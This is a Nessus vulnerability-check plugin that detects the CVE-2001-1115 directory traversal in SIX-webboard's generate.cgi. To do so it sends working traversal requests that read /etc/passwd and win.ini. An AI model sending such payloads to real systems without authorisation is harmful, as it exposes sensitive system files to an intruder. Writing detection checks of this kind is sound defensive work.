#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10725);
 script_version ("$Revision: 1.19 $");

 script_cve_id("CVE-2001-1115");
 script_bugtraq_id(3175);
 script_xref(name:"OSVDB", value:"603");
 
 script_name(english:"SIX-webboard generate.cgi content Variable Traveral Arbitrary File Access");
 script_summary(english:"Checks for the presence of generate.cgi");
 
 script_set_attribute(
  attribute:"synopsis",
  value:string(
   "The remote web server contains a CGI script that allows access to\n",
   "arbitrary files."
  )
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The version of the 'generate.cgi' from SIX-webboard installed on the\n",
   "remote web server allows an unauthenticated remote attacker to access\n",
   "arbitrary files with the privileges of the http daemon because it\n",
   "fails to filter input to the 'content' variable of directory\n",
   "traveresal sequences."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/bugtraq/2001-08/0172.html"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Unknown at this time."
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


flag = 0;

foreach dir (cgi_dirs())
{
 cgi = string(dir, "/webboard/generate.cgi");
 if(is_cgi_installed_ka(item:cgi, port:port))flag = 1;
 else
 {
 cgi = string(dir, "/generate.cgi");
 if(is_cgi_installed_ka(item:cgi, port:port)){
 	flag = 1;
	}
 }
}

if(!flag)exit(0);


 # may need to be improved...
 req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../etc/passwd%00board=board_1"),
		port:port);
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_warning(port);
   exit(0);
  }
 }
  req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../windows/win.ini%00board=board_1"),
		port:port);
		
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if("[windows]" >< r)
  {
   security_warning(port);
   exit(0);
  }
 }
 
 req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../winnt/win.ini%00board=board_1"),
		port:port);
		
  soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if("[fonts]" >< r)
  {
   security_warning(port);
   exit(0);
  }
 }
